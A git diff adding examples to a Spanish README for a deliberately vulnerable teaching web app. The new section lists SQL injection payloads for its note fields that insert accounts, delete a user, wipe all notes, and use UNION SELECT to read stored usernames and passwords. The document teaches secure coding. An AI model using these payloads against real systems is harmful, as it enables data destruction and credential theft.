@@ -66,6 +66,22 @@ Ya con el entorno virtual esté activado:
 
 En el archivo `scripts.txt` encontrarás ejemplos de inyecciones SQL que pueden utilizarse para explorar las vulnerabilidades de la aplicación.
 
+
+## Algunos ejemplos
+
+
+*  Al crear una nueva nota en el apartado de contenido:
+1. Agregar un usuario:
+   - `contenido"); INSERT INTO usuarios (nombre, usuario, password) VALUES ("Hacker", "hackeado@mail.com", "hackeado"); --`
+2. Agregar una nota:
+   - `contenido"); INSERT INTO notas (usuario_id, titulo, contenido) VALUES (1, "Fuiste hackeado", "No tengas miedo"); --`
+3. Eliminar un usuario
+   - `contenido"); DELETE from usuarios WHERE id = 3; --`
+4. E
+  contenido"); DELETE from notas; --
+  // al filtar una nota
+  a%" UNION SELECT id, nombre, usuario, password FROM usuarios --
+
 ## Nota importante
 
 Esta aplicación contiene vulnerabilidades intencionales y su propósito es únicamente educativo para comprender los riesgos de seguridad y la importancia de implementar prácticas seguras de programación.
